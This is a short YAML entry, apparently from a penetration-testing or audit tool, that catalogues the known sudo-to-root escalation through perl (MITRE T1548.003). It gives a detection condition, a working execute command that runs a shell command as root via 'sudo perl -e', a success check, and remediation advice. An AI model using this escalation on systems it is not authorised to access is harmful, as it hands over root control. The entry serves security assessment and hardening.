# Sudo → root via perl (GTFOBins)
technique: T1548.003
name: Sudo → root via perl (GTFOBins)
tactic: [privilege-escalation]
platform: [linux]
ranking:
  exploitability: high
  safety: read-only
  detection: quiet
detect:
  sudo_allows: perl
execute:
  command: 'sudo perl -e ''system("id");'''
verify:
  success: "uid=0"
cleanup:
  command: ""
report:
  vector_type: gtfobins_sudo
  description: Sudo NOPASSWD on `perl` allows arbitrary `system()` as root.
  remediation: Drop `perl` from sudoers.
  refs: [T1548.003, GTFOBins/perl]
